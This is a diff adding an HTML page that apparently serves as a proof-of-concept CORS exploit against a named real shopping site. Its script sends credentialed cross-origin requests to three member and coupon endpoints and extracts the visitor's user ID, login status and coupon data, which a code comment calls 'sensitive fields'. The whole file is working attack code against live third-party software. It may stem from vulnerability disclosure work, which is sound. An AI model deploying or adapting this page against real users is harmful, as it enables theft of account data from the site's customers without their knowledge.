@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>OPPO CORS PoC</title>
+</head>
+<body>
+  <h2>OPPO CORS Exploit PoC</h2>
+  <button onclick="runPoC()">Run PoC</button>
+  <pre id="output" style="white-space: pre-wrap; background:#f4f4f4; padding:10px; border:1px solid #ccc;"></pre>
+
+  <script>
+    async function runPoC() {
+      const endpoints = [
+        "https://www.opposhop.cn/cn/oapi/users/web/member/check",
+        "https://www.opposhop.cn/cn/oapi/users/web/couponsCenter/getPurposeCoupons?code=good_coupons&scene=couponCenter",
+        "https://www.opposhop.cn/cn/oapi/users/web/couponsCenter/getSecKillCoupons?code=everyday_coupons_center"
+      ];
+
+      let results = [];
+      for (let ep of endpoints) {
+        try {
+          let res = await fetch(ep, { method: "GET", credentials: "include" });
+          let text = await res.text();
+          let parsed = null;
+
+          try {
+            parsed = JSON.parse(text);
+          } catch(e) {}
+
+          if (parsed) {
+            // Extract sensitive fields
+            let sensitive = {};
+            if (parsed.userId) sensitive.userId = parsed.userId;
+            if (parsed.isLogin !== undefined) sensitive.isLogin = parsed.isLogin;
+            if (parsed.couponList || parsed.data) sensitive.couponData = parsed.couponList || parsed.data;
+
+            results.push("✅ " + ep + ":\nSensitive Data:\n" + JSON.stringify(sensitive, null, 2) + "\n");
+          } else {
+            results.push("ℹ️ " + ep + ":\nResponse:\n" + text.substring(0,300) + "...\n");
+          }
+        } catch (e) {
+          results.push("❌ " + ep + ":\nError - " + e + "\n");
+        }
+      }
+      document.getElementById("output").innerText = results.join("\n------\n\n");
+    }
+  </script>
+</body>
+</html>
